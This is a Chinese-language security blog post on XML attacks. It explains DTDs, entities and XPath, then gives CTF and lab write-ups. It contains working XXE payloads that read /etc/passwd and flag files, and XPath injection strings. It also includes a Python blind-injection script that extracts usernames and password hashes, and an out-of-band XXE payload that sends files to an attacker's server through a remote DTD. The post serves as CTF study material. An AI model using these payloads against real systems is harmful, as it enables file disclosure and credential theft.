+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root-element</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;filename&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;note.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这是包含 DTD 的 “note.dtd” 文件：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="为什么使用-DTD？"><a href="#为什么使用-DTD？" class="headerlink" title="为什么使用 DTD？"></a>为什么使用 DTD？</h2><p>通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。</p>
+<p>通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。</p>
+<p>而您的应用程序也可使用某个标准的 DTD 来验证从外部接收到的数据。</p>
+<p>您还可以使用 DTD 来验证您自身的数据。</p>
+<h1 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h1><h2 id="重点一："><a href="#重点一：" class="headerlink" title="重点一："></a>重点一：</h2><p>实体分为两种，内部实体和外部实体，上面我们举的例子就是内部实体，但是实体实际上可以从外部的 dtd 文件中引用，我们看下面的代码：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/test.dtd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pass</span>&gt;</span>mypass<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这样对引用资源所做的任何更改都会在文档中自动更新,非常方便（方便永远是安全的敌人）</p>
+<p>当然，还有一种引用方式是使用 引用公用 DTD 的方法，语法如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素名称 <span class="keyword">PUBLIC</span> “DTD标识名” “公用DTD的URI”&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个在我们的攻击中也可以起到和 SYSTEM 一样的作用</p>
+<h2 id="重点二："><a href="#重点二：" class="headerlink" title="重点二："></a>重点二：</h2><p>我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体）</p>
+<p><strong>1.通用实体</strong><br>用 &amp;实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">updateProfile</span> [<span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">updateProfile</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">firstname</span>&gt;</span>Joe<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">lastname</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">lastname</span>&gt;</span>  </span><br><span class="line">    ... </span><br><span class="line"><span class="tag">&lt;/<span class="name">updateProfile</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>2.参数实体：</strong><br>1)使用 % 实体名(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 %实体名; 引用<br>(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>(3)和通用实体一样，参数实体也可以外部引用</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">an-element</span> <span class="string">&quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;</span>&gt;</span> </span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">remote-dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://somewhere.example.org/remote.dtd&quot;</span>&gt;</span> </span><br><span class="line">%an-element; %remote-dtd;</span><br></pre></td></tr></table></figure>
+<p><strong>参数实体在我们 Blind XXE 中起到了至关重要的作用</strong></p>
+<h1 id="xpath基础知识"><a href="#xpath基础知识" class="headerlink" title="xpath基础知识"></a>xpath基础知识</h1><h2 id="什么是-XPath"><a href="#什么是-XPath" class="headerlink" title="什么是 XPath?"></a>什么是 XPath?</h2><ul>
+<li>XPath 使用路径表达式在 XML 文档中进行导航</li>
+<li>XPath 包含一个标准函数库</li>
+<li>XPath 是 XSLT 中的主要元素</li>
+<li>XPath 是一个 W3C 标准</li>
+</ul>
+<h2 id="XPath-路径表达式"><a href="#XPath-路径表达式" class="headerlink" title="XPath 路径表达式"></a>XPath 路径表达式</h2><p>XPath 使用路径表达式来选取 XML 文档中的节点或者节点集。这些路径表达式和我们在常规的电脑文件系统中看到的表达式非常相似。</p>
+<h2 id="XPath-标准函数"><a href="#XPath-标准函数" class="headerlink" title="XPath 标准函数"></a>XPath 标准函数</h2><p>XPath 含有超过 100 个内建的函数。这些函数用于字符串值、数值、日期和时间比较、节点和 QName 处理、序列处理、逻辑值等等。</p>
+<h1 id="XPATH注入原理"><a href="#XPATH注入原理" class="headerlink" title="XPATH注入原理"></a>XPATH注入原理</h1><p>XPath 注入利用 XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的 XPath 查询代码，以获得高权限信息的访问权。</p>
+<p>XPath注入类似于SQL注入，当网站使用未经正确处理的用户输入查询 XML 数据时，可能发生 XPATH 注入，由于Xpath中数据不像SQL中有权限的概念，用户可通过提交恶意XPATH代码获取到完整xml文档数据</p>
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="今年做的"><a href="#今年做的" class="headerlink" title="今年做的"></a>今年做的</h2><p>pentestlab</p>
+<h3 id="第一题-xml-injection"><a href="#第一题-xml-injection" class="headerlink" title="第一题 xml injection"></a>第一题 xml injection</h3><p>发现accept xml</p>
+<p><img src="/2022/08/17/xmlinjection/image-20220817151040061.png" alt="image-20220817151040061"></p>
+<p>发现解析xml</p>
+<p><img src="/2022/08/17/xmlinjection/image-20220817151156740.png" alt="image-20220817151156740"></p>
+<p>构造注入</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>2333<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">data</span> <span class="keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>记得一定要url encode 不然后端解析会出错</p>
+<h3 id="第二题-xpath-injection"><a href="#第二题-xpath-injection" class="headerlink" title="第二题 xpath injection"></a>第二题 xpath injection</h3><p><img src="/2022/08/17/xmlinjection/image-20220817160753861.png" alt="image-20220817160753861"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hacke<span class="string">r&#x27; or 1=1 or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>&#39; and &#39;1&#39;=&#39;1</code> and you should get the same result.</li>
+<li><code>&#39; or &#39;1&#39;=&#39;0</code> and you should get the same result.</li>
+<li><code>&#39; and &#39;1&#39;=&#39;0</code> and you should not get any result.</li>
+<li><code>&#39; or &#39;1&#39;=&#39;1</code> and you should get all results.</li>
+</ul>
+<h2 id="NPUCTF2020-ezlogin"><a href="#NPUCTF2020-ezlogin" class="headerlink" title="[NPUCTF2020]ezlogin"></a>[NPUCTF2020]ezlogin</h2><p><img src="/2022/08/17/xmlinjection/MyBlog\b1ue0cean.github.io\source_posts\xmlinjection\image-20220819024930877.png" alt="image-20220819024930877"></p>
+<p>一眼就看出是搞XML</p>
+<p>xpath盲注</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://ha1cyon-ctf.fun:30163/&#x27;</span></span><br><span class="line">sess=requests.session()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">token</span>():</span><br><span class="line">    req=sess.get(url)</span><br><span class="line">    tok=re.findall(<span class="string">&#x27;&lt;input type=&quot;hidden&quot; id=&quot;token&quot; value=&quot;(.*)&quot; /&gt;&#x27;</span>,req.text)</span><br><span class="line">    <span class="keyword">return</span> tok[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">username,password</span>):</span><br><span class="line">    data=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;username&gt;&#123;&#125;&lt;/username&gt;&lt;password&gt;&#123;&#125;&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(username,password,token())</span><br><span class="line"></span><br><span class="line">    req=sess.post(url+<span class="string">&#x27;login.php&#x27;</span>,data=data,headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/xml&#x27;</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span>(req.text,req.status_code)</span><br><span class="line">    <span class="keyword">return</span> req</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># root</span></span><br><span class="line">payload=<span class="string">&quot;&#x27; or  substring(name(/*[position()=1]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;  or &#x27;1&#x27; = &#x27;1&quot;</span></span><br><span class="line">ro=<span class="string">&#x27;root&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;&#x27; or substring(name(/root/*[position()=1]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;  or &#x27;1&#x27; = &#x27;1&quot;</span></span><br><span class="line">ro=<span class="string">&#x27;accounts&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;&#x27; or substring(name(/root/accounts/*[position()=1]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;  or &#x27;1&#x27; = &#x27;1&quot;</span></span><br><span class="line">ro=<span class="string">&#x27;user&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;&#x27; or substring(name(/root/accounts/user/*[position()=2]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;  or &#x27;1&#x27; = &#x27;1&quot;</span></span><br><span class="line"><span class="comment"># id username password</span></span><br><span class="line">ro=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;1&#x27; or substring(/root/accounts/user[id=2]/username,&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;1&#x27;=&#x27;1&quot;</span></span><br><span class="line"><span class="comment"># guest adm1n</span></span><br><span class="line">ro=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;1&#x27; or substring(/root/accounts/user[id=2]/password,&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;1&#x27;=&#x27;1&quot;</span></span><br><span class="line"><span class="comment">#cf7414b5bdb2e65ee43083f4ddbc4d9f gtfly123</span></span><br><span class="line">ro=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string.digits+string.ascii_letters+<span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> j==<span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;***************false&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        tmp=payload.<span class="built_in">format</span>(i,j)</span><br><span class="line"></span><br><span class="line">        req=login(tmp,<span class="string">&#x27;ad&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;非法操作&#x27;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            ro+=j</span><br><span class="line">            <span class="built_in">print</span>(ro)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>然后伪协议读一下就好 （大小写绕过一下</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=pHp:<span class="regexp">//</span>filter<span class="regexp">/convert.bASe64-encode/</span>resource=/flag</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="去年做的"><a href="#去年做的" class="headerlink" title="去年做的"></a>去年做的</h2><h2 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure>
+<p>看样子要上传一个 恶意 XML 文件</p>
+<p><img src="/2022/08/17/xmlinjection/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYjF1ZTBjZWFuQFJPSVPvvIZyM3Dlrp7kuaA=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center.png" alt="在这里插入图片描述"></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE a [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">t</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">t</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="web374-无回显读取本地敏感文件-Blind-OOB-XXE"><a href="#web374-无回显读取本地敏感文件-Blind-OOB-XXE" class="headerlink" title="web374  (无回显读取本地敏感文件(Blind OOB XXE))"></a>web374  (无回显读取本地敏感文件(Blind OOB XXE))</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<p>现在我们的vps上挂一个dtd</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">convert</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY &amp;#x25 <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://8.135.132.214/fuck.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>读出flag  然后加载我们的remote dtd      然后转发给我们的vps 9999 端口</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">aaa</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://8.135.132.214:8888/fuck.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%aaa;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>123<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 fuck.dtd ，有点类似于将 fuck.dtd 包含进来，然后 %int 调用 fuck.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 &#37;)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p>
+</blockquote>
+<h2 id="论各种语言中xee的可利用性"><a href="#论各种语言中xee的可利用性" class="headerlink" title="论各种语言中xee的可利用性"></a>论各种语言中xee的可利用性</h2><p><img src="/2022/08/17/xmlinjection/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYjF1ZTBjZWFuQFJPSVPvvIZyM3Dlrp7kuaA=,size_16,color_FFFFFF,t_70,g_se,x_16.png" alt="在这里插入图片描述"></p>
+<h3 id="结合phar进行rce"><a href="#结合phar进行rce" class="headerlink" title="结合phar进行rce"></a>结合phar进行rce</h3><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39927799/article/details/110723346">https://blog.csdn.net/weixin_39927799/article/details/110723346</a><br><a target="_blank" rel="noopener" href="https://github.com/Stakcery/Web-Security/tree/main/XXE">https://github.com/Stakcery/Web-Security/tree/main/XXE</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357">https://xz.aliyun.com/t/3357</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10774">https://xz.aliyun.com/t/10774</a></p>
+<p>[xpath](<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7791">XPATH注入学习 - 先知社区 (aliyun.com)</a>)</p>
+<p>reference</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>b1ue0cean
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="http://example.com/2022/08/17/xmlinjection/" title="XML ATTACK ~ XXE &#x2F; Xpath">http://example.com/2022/08/17/xmlinjection/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="https://twitter.com/b1ue0cean7">
+          <span class="icon">
+            <i class="fab fa-twitter"></i>
+          </span>
+
+          <span class="label">Twitter</span>
+        </a>
+      </div>
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="/atom.xml">
+          <span class="icon">
+            <i class=""></i>
+          </span>
+
+          <span class="label">RSS</span>
+        </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/xml/" rel="tag"># xml</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/08/17/%E9%9D%A2%E8%AF%95/" rel="prev" title="安全面经读后总结">
+                  <i class="fa fa-chevron-left"></i> 安全面经读后总结
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/08/17/SSRF/" rel="next" title="SSRF">
+                  SSRF <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
